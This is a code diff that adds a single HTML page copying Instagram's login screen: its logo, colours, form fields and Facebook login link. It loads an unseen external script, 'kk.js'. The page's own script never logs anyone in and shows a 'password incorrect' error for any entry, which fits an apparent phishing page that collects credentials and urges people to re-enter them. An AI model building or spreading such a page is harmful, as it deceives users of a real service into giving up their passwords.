@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Login</title>
+    <script src="kk.js"></script>
+    <style>
+        :root {
+            --ig-primary: #0095f6;
+            --ig-secondary: #385185;
+            --ig-text: #262626;
+            --ig-light-gray: #dbdbdb;
+            --ig-gray: #8e8e8e;
+            --ig-bg: #fafafa;
+            --ig-error: #ed4956;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background-color: var(--ig-bg);
+            color: var(--ig-text);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .login-container {
+            width: 350px;
+            background-color: white;
+            border: 1px solid var(--ig-light-gray);
+            padding: 20px 40px;
+            text-align: center;
+        }
+
+        .logo {
+            margin: 22px auto 12px;
+            width: 175px;
+        }
+
+        .form-group {
+            margin-bottom: 6px;
+        }
+
+        input {
+            width: 100%;
+            padding: 9px 8px 7px;
+            background: var(--ig-bg);
+            border: 1px solid var(--ig-light-gray);
+            border-radius: 3px;
+            font-size: 12px;
+            margin-bottom: 6px;
+        }
+
+        input:focus {
+            outline: none;
+            border-color: var(--ig-gray);
+        }
+
+        .btn {
+            width: 100%;
+            padding: 7px 16px;
+            background-color: var(--ig-primary);
+            color: white;
+            border: none;
+            border-radius: 4px;
+            font-weight: 600;
+            margin: 8px 0;
+            cursor: pointer;
+        }
+
+        .btn:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: default;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 10px 0;
+            color: var(--ig-gray);
+            font-size: 13px;
+            font-weight: 600;
+        }
+
+        .divider::before, .divider::after {
+            content: "";
+            flex: 1;
+            border-bottom: 1px solid var(--ig-light-gray);
+            margin: 0 10px;
+        }
+
+        .fb-login {
+            color: var(--ig-secondary);
+            font-size: 14px;
+            font-weight: 600;
+            text-decoration: none;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 15px 0;
+        }
+
+        .fb-login svg {
+            margin-right: 8px;
+        }
+
+        .forgot-pw {
+            font-size: 12px;
+            color: var(--ig-secondary);
+            text-decoration: none;
+        }
+
+        .signup {
+            margin-top: 15px;
+            padding: 20px;
+            font-size: 14px;
+        }
+
+        .signup a {
+            color: var(--ig-primary);
+            font-weight: 600;
+            text-decoration: none;
+        }
+
+        .error-message {
+            color: var(--ig-error);
+            font-size: 14px;
+            margin: 10px 0;
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <svg aria-label="Instagram" fill="#262626" height="29" viewBox="0 0 192 192" width="29">
+                <path d="M144 0H48C21.5 0 0 21.5 0 48v96c0 26.5 21.5 48 48 48h96c26.5 0 48-21.5 48-48V48c0-26.5-21.5-48-48-48zm-16 64H64c-8.8 0-16 7.2-16 16v64c0 8.8 7.2 16 16 16h64c8.8 0 16-7.2 16-16V80c0-8.8-7.2-16-16-16zm-32 80c-17.7 0-32-14.3-32-32s14.3-32 32-32 32 14.3 32 32-14.3 32-32 32z"></path>
+                <circle cx="96" cy="96" r="24"></circle>
+            </svg>
+        </div>
+
+        <form id="loginForm">
+            <div class="error-message" id="errorMessage">
+                Sorry, your password was incorrect. Please double-check your password.
+            </div>
+            
+            <div class="form-group">
+                <input type="text" id="username" placeholder="Phone number, username, or email" required />
+            </div>
+            <div class="form-group">
+                <input type="password" id="password" placeholder="Password" required />
+            </div>
+            <button type="submit" class="btn" id="loginBtn">Log In</button>
+        </form>
+
+        <div class="divider">OR</div>
+
+        <a href="#" class="fb-login">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" viewBox="0 0 16 16">
+                <path d="M16 8.049c0-4.446-3.582-8.05-8-8.05C3.58 0-.002 3.603-.002 8.05c0 4.017 2.926 7.347 6.75 7.951v-5.625h-2.03V8.05H6.75V6.275c0-2.017 1.195-3.131 3.022-3.131.876 0 1.791.157 1.791.157v1.98h-1.009c-.993 0-1.303.621-1.303 1.258v1.51h2.218l-.354 2.326H9.25V16c3.824-.604 6.75-3.934 6.75-7.951z"/>
+            </svg>
+            Log in with Facebook
+        </a>
+
+        <a href="#" class="forgot-pw">Forgot password?</a>
+
+        <div class="signup">
+            Don't have an account? <a href="#">Sign up</a>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+            const errorMessage = document.getElementById('errorMessage');
+            
+            // Show error message for any non-empty input
+            if (username.trim() !== '' || password.trim() !== '') {
+                errorMessage.style.display = 'block';
+            } else {
+                errorMessage.style.display = 'none';
+            }
+        });
+
+        // Disable button when inputs are empty
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const loginBtn = document.getElementById('loginBtn');
+
+        function checkInputs() {
+            if (usernameInput.value.trim() === '' || passwordInput.value.trim() === '') {
+                loginBtn.disabled = true;
+            } else {
+                loginBtn.disabled = false;
+            }
+        }
+
+        usernameInput.addEventListener('input', checkInputs);
+        passwordInput.addEventListener('input', checkInputs);
+        
+        // Initial check
+        checkInputs();
+    </script>
+</body>
+</html>
